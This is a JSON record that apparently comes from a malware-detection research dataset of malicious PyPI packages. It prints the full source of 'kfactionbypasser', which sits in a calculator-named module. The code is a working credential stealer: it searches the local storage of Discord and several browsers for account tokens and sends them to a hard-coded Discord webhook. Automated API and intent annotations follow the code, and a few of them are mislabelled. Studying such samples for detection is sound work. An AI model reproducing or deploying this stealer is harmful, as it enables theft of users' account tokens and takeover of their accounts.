{
  "metadata": {
    "package_name": "kfactionbypasser-0.0.1",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/kfactionbypasser-0.0.1.txt",
    "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/kfactionbypasser-0.0.1/kfactionbypasser-0.0.1/joshbasiccalculator/__init__.py",
    "code_hash": "e35dcfa9a449c92b3c1327ad7563ab2a",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/kfactionbypasser-0.0.1.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "hash_value": "e35dcfa9a449c92b3c1327ad7563ab2a",
      "code_snippets": [
        {
          "snippet": "import os\nimport re\nimport json\nfrom urllib.request import Request, urlopen\n\n# your webhook URL\nWEBHOOK_URL = 'https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba'\n\nPING_ME = False\n\ndef find_tokens(path):\n    path += '\\\\Local Storage\\\\leveldb'\n\n    tokens = []\n\n    for file_name in os.listdir(path):\n        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n            continue\n\n        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n            for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                for token in re.findall(regex, line):\n                    tokens.append(token)\n    return tokens\n\ndef main():\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n\n    paths = {\n        'Discord': roaming + '\\\\Discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n    }\n\n    message = '@everyone' if PING_ME else ''\n\n    for platform, path in paths.items():\n        if not os.path.exists(path):\n            continue\n\n        message += f'\\n**{platform}**\\n```\\n'\n\n        tokens = find_tokens(path)\n\n        if len(tokens) > 0:\n            for token in tokens:\n                message += f'{token}\\n'\n        else:\n            message += 'No tokens found.\\n'\n\n        message += '```'\n\n    headers = {\n        'Content-Type': 'application/json',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'\n    }\n\n    payload = json.dumps({'content': message})\n\n    try:\n        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)\n        urlopen(req)\n    except:\n        pass\n\nif __name__ == '__main__':\n    main()",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path + '\\\\Local Storage\\\\leveldb'",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\\\{file_name}', errors='ignore'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.readlines()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "str.strip()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "x",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "{'content': message}",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "payload",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "urllib.request.Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "WEBHOOK_URL, data=payload.encode(), headers=headers",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "req",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            }
          ]
        }
      ]
    }
  ]
}